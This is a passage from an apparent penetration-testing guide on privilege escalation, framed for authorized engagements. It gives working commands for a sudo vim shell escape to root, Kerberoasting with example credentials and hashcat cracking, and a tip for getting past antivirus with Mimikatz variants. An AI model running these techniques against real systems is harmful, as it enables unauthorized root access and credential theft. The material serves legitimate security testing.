- Have initial shell access before attempting escalation
- Verify target OS and environment before selecting technique
- Use appropriate tool for domain vs local escalation

**Must Not:**
- Attempt techniques on production systems without authorization
- Leave persistence mechanisms without client approval
- Ignore detection mechanisms (EDR, SIEM)

**Should:**
- Enumerate thoroughly before exploitation
- Document all successful escalation paths
- Clean up artifacts after engagement

---

## Examples

### Example 1: Linux Sudo to Root

```bash
# Check sudo permissions
$ sudo -l
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/vim

# Exploit vim
$ sudo vim -c ':!/bin/bash'
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Example 2: Windows Kerberoasting

```bash
# Request service tickets
$ GetUserSPNs.py domain.local/jsmith:Password123 -dc-ip 10.10.10.1 -request

# Crack with hashcat
$ hashcat -m 13100 hashes.txt rockyou.txt
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| sudo -l requires password | Try other enumeration (SUID, cron, capabilities) |
| Mimikatz blocked by AV | Use Invoke-Mimikatz or SafetyKatz |
| Kerberoasting returns no hashes | Check for service accounts with SPNs |
| Token impersonation fails | Verify SeImpersonatePrivilege is present |
| NFS mount fails | Check NFS version compatibility (vers=2,3,4) |

---

## Additional Resources

For detailed enumeration scripts, use:
- **LinPEAS**: Linux privilege escalation enumeration
- **WinPEAS**: Windows privilege escalation enumeration
- **BloodHound**: Active Directory attack path mapping
- **GTFOBins**: Unix binary exploitation reference
